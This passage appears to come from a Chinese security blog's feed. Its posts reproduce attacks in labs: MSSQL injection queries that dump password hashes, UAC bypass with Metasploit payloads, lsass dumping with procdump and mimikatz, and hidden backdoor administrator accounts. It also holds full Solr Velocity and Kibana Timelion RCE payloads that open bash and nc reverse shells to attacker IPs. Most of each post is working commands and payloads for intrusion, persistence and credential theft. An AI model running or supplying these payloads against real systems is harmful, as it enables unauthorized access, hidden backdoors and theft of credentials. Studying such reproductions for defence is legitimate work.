class="line">@@SERVERNAME//主机名</span><br></pre></td></tr></table></figure></p><p>(这里抛出一个问题让大家思考，sqlmap注入中一长串char字符是用来干什么的)</p><p>由于篇幅原因，这里贴出sqlmap检测中一些语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select name FROM sys.sql_logins//查询所有用户</span><br><span class="line">select master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins//查询所有的密码</span><br><span class="line">select IS_SRVROLEMEMBER(xxxx)//判断是否为dba权限</span><br></pre></td></tr></table></figure></p><h2 id="xp-shell"><a href="#xp-shell" class="headerlink" title="xp_shell"></a>xp_shell</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>启动/关闭xp_cmdshell：<a href="https://www.cnblogs.com/songsz1/archive/2012/12/26/2833856.html" target="_blank" rel="noopener">https://www.cnblogs.com/songsz1/archive/2012/12/26/2833856.html</a></p><p>《Windows server 2008 r2》配置IIS7+asp.net：<a href="https://blog.csdn.net/liang_operations/article/details/89980023" target="_blank" rel="noopener">https://blog.csdn.net/liang_operations/article/details/89980023</a></p><p>SQL Server xtype的介绍：<a href="https://www.2cto.com/database/201307/230722.html" target="_blank" rel="noopener">https://www.2cto.com/database/201307/230722.html</a></p><p>MSSQL注入提权的一些方法：<a href="https://www.cnblogs.com/FayJack/archive/2013/05/13/3075697.html" target="_blank" rel="noopener">https://www.cnblogs.com/FayJack/archive/2013/05/13/3075697.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验环境：&lt;br&gt;windows 2008 + sql server 2008 + IIS7.5&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="注入" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Windows下bypassuac</title>
    <link href="http://yoursite.com/2019/11/08/Windows%E4%B8%8Bbypassuac/"/>
    <id>http://yoursite.com/2019/11/08/Windows下bypassuac/</id>
    <published>2019-11-08T11:27:00.000Z</published>
    <updated>2019-11-09T10:14:33.579Z</updated>
    
    <content type="html"><![CDATA[<p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！<br><a id="more"></a></p><h1 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h1><p>有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样<br><img src="/2019/11/08/Windows下bypassuac/error.png" alt><br>这个问题是要用管理员打开cmd才能添加账号<br><img src="/2019/11/08/Windows下bypassuac/cmd_1.png" alt><br><img src="/2019/11/08/Windows下bypassuac/cmd_2.png" alt><br>这个时候我们就要绕过windows的uac策略了</p><h1 id="Msf-bypassuac"><a href="#Msf-bypassuac" class="headerlink" title="Msf bypassuac"></a>Msf bypassuac</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#生成一个木马文件，放到目标机器上面</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.128 --platform windows lport=4444 -f exe &gt; uac.exe</span><br><span class="line"></span><br><span class="line">#打开msfconsole，设置监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br><span class="line">#然后在目标机器上面运行传上去的木马文件</span><br></pre></td></tr></table></figure><p>这个时候我们拿到了meterpreter<br><img src="/2019/11/08/Windows下bypassuac/getsystem_1.png" alt></p><p>getsystem是有问题的，说明不是最高权限</p><p>这个时候我们返回msf控制台，并保留session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#设置uac的payload</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/11/08/Windows下bypassuac/getsystem_2.png" alt><br>这个时候getsystem应该没有问题了<br><img src="/2019/11/08/Windows下bypassuac/success.png" alt></p><p>bypassuac成功，可以添加用户了</p><h1 id="cobalt-strike-bypassuac"><a href="#cobalt-strike-bypassuac" class="headerlink" title="cobalt strike bypassuac"></a>cobalt strike bypassuac</h1><p><img src="/2019/11/08/Windows下bypassuac/shell.png" alt><br>一样的，首先生成一个后门木马，上传到目标机器上面，并且运行<br><img src="/2019/11/08/Windows下bypassuac/sherl.png" alt><br>看到这里有回显了，右键进入beacon，输入bypassuac<br><img src="/2019/11/08/Windows下bypassuac/csbypass.png" alt><br>然后设置好监听的端口，输入命令<br><img src="/2019/11/08/Windows下bypassuac/cs.png" alt><br>就成功啦~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>使用procdump64和mimikatz抓取Windows用户密码</title>
    <link href="http://yoursite.com/2019/11/08/%E4%BD%BF%E7%94%A8procdump64%E5%92%8Cmimikatz%E6%8A%93%E5%8F%96Windows%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/</id>
    <published>2019-11-08T08:52:49.000Z</published>
    <updated>2019-11-09T10:15:24.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章<br><a id="more"></a><br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/error.png" alt><br>报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)</span><br></pre></td></tr></table></figure></p><h1 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h1><p>利用procdump64+mimikatz解决，前提是windows要运行了lsass.exe<br><img src="/2019/11/08/使用procdump64和mimikatz抓取Windows用户密码/lsass.png" alt></p><p>并且命令要在cmd右键管理员身份运行，这里就要bypassuac了，不然运行命令会保存</p><p>lsass.exe用户安全和登陆策略，我们要通过procdump64读取其中的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure></p><p>然后用mimikatz读取这个生成的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure></p><p>就成功了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;今天在渗透的时候，利用mimikata抓取用户密码报错了，很曹丹，于是就有了这篇文章&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows下两个隐藏后门用户的小技巧</title>
    <link href="http://yoursite.com/2019/11/06/Windows%E4%B8%8B%E4%B8%A4%E4%B8%AA%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2019/11/06/Windows下两个隐藏后门用户的小技巧/</id>
    <published>2019-11-06T12:20:56.000Z</published>
    <updated>2019-11-09T10:16:28.748Z</updated>
    
    <content type="html"><![CDATA[<p>我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧<br><a id="more"></a></p><h1 id="用户后面添加"><a href="#用户后面添加" class="headerlink" title="用户后面添加$"></a>用户后面添加$</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure><p>这样我们在net user的时候我们添加的用户就不会被显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/user.png" alt><br>不过在登陆的时候这个账号还是显示出来了<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login.png" alt></p><h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>regedit打开注册表，然后找到HKEY_LOCAL_MACHINE\SAM\SAM,右键点击权限，将读写权限赋予 administrator<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/sam.png" alt><br>重新打开注册表(这里不重新打开，sam目录下的内容无法展开)</p><p>将 administrator 对应目录中的F值复制到后门用户对应目录中的F值<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/f.png" alt><br>复制完成后，把 defaultuser0$ 和其对应的 0000003EC 目录导出并保存(这里不一定是3EC，具体你看你用户的类型)<br><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/export.png" alt><br>然后删除刚才的后门用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure><p><img src="/2019/11/06/Windows下两个隐藏后门用户的小技巧/login_2.png" alt><br>这里defaultuser0$就没有了</p><p>然后我们远程桌面连接，输入后门的账号密码就行了</p><p>不过据说这两种方法都不是很安全，还待后续挖掘更多的后门小技巧</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们在渗透的过程中拿到权限之后想要植入后门(3389登陆)，net命令添加用户还是太明显了，无论是net user 或者登陆的时候都能看见我们创建的后门账号，今天碰巧看了篇实战文章，记录个留后门的小技巧&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="后门" scheme="http://yoursite.com/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Solr Velocity模板远程命令执行漏洞+反弹shell</title>
    <link href="http://yoursite.com/2019/11/04/Solr-Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/11/04/Solr-Velocity模板远程命令执行漏洞/</id>
    <published>2019-11-04T07:15:33.000Z</published>
    <updated>2019-11-04T08:23:23.080Z</updated>
    
    <content type="html"><![CDATA[<p>这个漏洞出来好几天了一直没有时间进行复现</p><p>漏洞需要java的环境，这里我就直接在kali上进行搭建了<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先下载源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.tgz</span><br></pre></td></tr></table></figure></p><p>解压之后进入bin目录下，运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr create_core -c alice -d ../example/example-DIH/solr/db -force</span><br></pre></td></tr></table></figure></p><p>这里是新建了一个alice的core，然后启用环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></figure></p><p>默认端口是8983，我们访问这个地址，然后在core admin中找到了alice<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/alice.png" alt></p><p>每一个我们新建的core都有配置信息<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/config.png" alt></p><p>这里我们要修改一下配置，我们要将params.resource.loader.enabled这个参数设置为true，默认为false，才能触发漏洞，post提交下面的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">   &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">   &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">   &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;:&quot;&quot;,</span><br><span class="line">   &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">   &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/post.png" alt><br>返回200，说明修改成功</p><p>漏洞环境就搭建到这里啦</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.128:8983/solr/alice/select?q=1&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/id.png" alt></p><p>这样就可以执行命令了，github上也有很多利用的脚本</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>这里好像和之前泛微oa的命令执行是一样的，利用了getRuntime().exec()这个函数来执行命令，但是这个函数有一些特性，可以看下面的文章和内容<br><a href="https://mp.weixin.qq.com/s/ZS-hA03ykKleDjgN8oWZDw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZS-hA03ykKleDjgN8oWZDw</a><br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/runtime.png" alt></p><p>所以我们直接执行命令的时候不能使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></p><p>而是要利用base64编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYxIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure></p><p>这里我们来实验一下：<br>目标机器:192.168.43.128<br>攻击机器:192.168.43.1</p><p>首先在攻击机器上设置nc监听端口<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/nc.png" alt></p><p>然后将我们反弹shell的bash命令进行base64编码：<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/base64.png" alt></p><p>然后进行一次url编码<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/url.png" alt></p><p>构造后的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27bash+-c+%7becho%2cYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjQzLjEvMTEyMzMgMD4mMQ%3d%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%27</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/success.png" alt><br>这样我们就能反弹shell了<br>脚本就不写咯<br>:)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞出来好几天了一直没有时间进行复现&lt;/p&gt;
&lt;p&gt;漏洞需要java的环境，这里我就直接在kali上进行搭建了&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux PTRACE_TRACEME 本地提权漏洞复现</title>
    <link href="http://yoursite.com/2019/10/21/Linux-PTRACE-TRACEME-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/</id>
    <published>2019-10-21T05:08:12.000Z</published>
    <updated>2019-10-21T05:17:14.571Z</updated>
    
    <content type="html"><![CDATA[<p>本地搭建了一个ubuntu的虚拟机，想着提权玩玩<br><a id="more"></a><br>首先我们查看内核版本<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/uname.png" alt></p><p>内核是4.10的，然后打开<a href="https://www.exploit-db.com" title="https://www.exploit-db.com" target="_blank" rel="noopener">exploit-db.com</a></p><p>搜索linux kernel，然后找到了这个漏洞<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/kernel.png" alt><br>下载exp文件，然后用gcc编译，添加运行权限，运行看效果<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/root.png" alt><br>提权成功了~~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本地搭建了一个ubuntu的虚拟机，想着提权玩玩&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>kibana&lt;6.6.0漏洞复现</title>
    <link href="http://yoursite.com/2019/10/19/kibana-6-6-0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/19/kibana-6-6-0漏洞复现/</id>
    <published>2019-10-19T07:45:44.000Z</published>
    <updated>2019-10-19T08:04:30.323Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞好像2月份就出来CVE了，最近才开始有人传exp<br><a id="more"></a></p><ul><li>Ubuntu16.04</li><li>elasticsearch-6.5.3</li><li>kibana-6.5.3-linux-x86_64</li></ul><p>注意：elasticsearch和kibana的版本要对应，运行的时候要以非root权限运行，并且要安装java环境</p><p>首先我们下载这两个软件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.5.3.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://artifacts.elastic.co/downloads/kibana/kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure></p><p>解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf elasticsearch-6.5.3.tar.gz</span><br><span class="line">tar -zxvf kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure></p><p>先运行elasticsearch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-6.5.3</span><br><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure></p><p>然后我们访问：<a href="http://127.0.0.1:9200" target="_blank" rel="noopener">http://127.0.0.1:9200</a><br><img src="/2019/10/19/kibana-6-6-0漏洞复现/9200.png" alt><br>访问成这样，说明运行成功</p><p>然后我们接着运行kibana<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd kibana-6.5.3-linux-x86_64</span><br><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure></p><p>访问：<a href="http://127.0.0.1:5601" target="_blank" rel="noopener">http://127.0.0.1:5601</a><br><img src="/2019/10/19/kibana-6-6-0漏洞复现/5601.png" alt><br>说明搭建成功</p><p><img src="/2019/10/19/kibana-6-6-0漏洞复现/poc.png" alt><br>点击Timelion，输入我们的payload，这里提供两个<br>bash反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.229.1/7770 0&gt;&amp;1&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></figure></p><p>nc反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;nc -e /bin/bash 192.168.229.1 7770&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></figure></p><p>这样我们就拿到shell了</p><p><img src="/2019/10/19/kibana-6-6-0漏洞复现/whoami.png" alt></p><h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p>原作者分析地址：<br><a href="https://slides.com/securitymb/prototype-pollution-in-kibana/" title="https://slides.com/securitymb/prototype-pollution-in-kibana/" target="_blank" rel="noopener">https://slides.com/securitymb/prototype-pollution-in-kibana/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个洞好像2月份就出来CVE了，最近才开始有人传exp&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
